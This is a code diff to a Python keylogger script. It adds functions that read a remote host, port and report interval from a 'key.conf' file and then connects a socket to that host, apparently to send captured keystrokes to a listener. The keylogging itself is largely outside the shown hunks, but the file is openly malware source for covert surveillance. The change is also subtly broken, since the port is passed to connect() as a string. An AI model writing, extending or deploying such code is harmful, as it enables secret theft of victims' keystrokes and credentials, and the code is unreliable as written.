@@ -3,6 +3,7 @@ from threading import Semaphore, Timer
 import sys
 import signal
 import socket
+import configparser
 
 report_time = 4
 host = '127.0.0.1'
@@ -14,8 +15,22 @@ def interrupt_handler(signal, frame):
     print("[-] Exiting...")
     sys.exit(0)
 
+def getaddr():
+    conf = configparser.ConfigParser()
+    conf.read_file(open('key.conf'))
+    host = conf.get('connection','host')
+    port = conf.get('connection','port')
+    return (host,port)
+
+def getinterval():
+    conf = configparser.ConfigParser()
+    conf.read_file(open('key.conf'))
+    intv = conf.get('interval','time_interval')
+    return intv
+
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((host, port))
+addr = getaddr()
+client.connect(addr)
     
 class Keylogger:
     def __init__(self, interval):
@@ -58,5 +73,5 @@ class Keylogger:
     
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, interrupt_handler)
-    keylogger = Keylogger(interval=report_time)
+    keylogger = Keylogger(interval=getinterval())
     keylogger.start()
